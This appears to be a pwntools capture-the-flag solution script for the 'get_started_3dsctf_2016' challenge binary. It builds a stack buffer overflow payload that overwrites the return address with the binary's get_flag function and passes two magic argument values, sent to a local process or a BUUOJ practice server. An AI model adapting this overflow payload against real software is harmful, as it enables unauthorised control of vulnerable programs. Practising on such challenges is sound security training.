from pwn import *

TMUX = 0
DEBUG = 1
LOG_PRINT = 1
def LOG_SUCCESS(str_print):
    global LOG_PRINT
    if LOG_PRINT:
        log.success(str_print)


if DEBUG:
    io = process('./get_started_3dsctf_2016')
    
    context(log_level='debug')
    if TMUX:
        context.terminal = ['tmux', 'splitw', '-h']
        gdb.attach(io)
else:
    io = remote('node3.buuoj.cn', 29172)
io_elf = ELF('./get_started_3dsctf_2016')
# log.success("pid: {}".format(proc.pidof(io)))
# 
target_addr = 0x080489B8
get_flag_addr = io_elf.sym['get_flag']
LOG_SUCCESS("get_flag_addr ===> {}".format(hex(get_flag_addr)))
# io.recvuntil("Qual a palavrinha magica? ")
payload = 0x38 * b'a' + p32(get_flag_addr) + b'a' * 4 + p32(814536271) + p32(425138641)
io.sendline(payload)
io.interactive()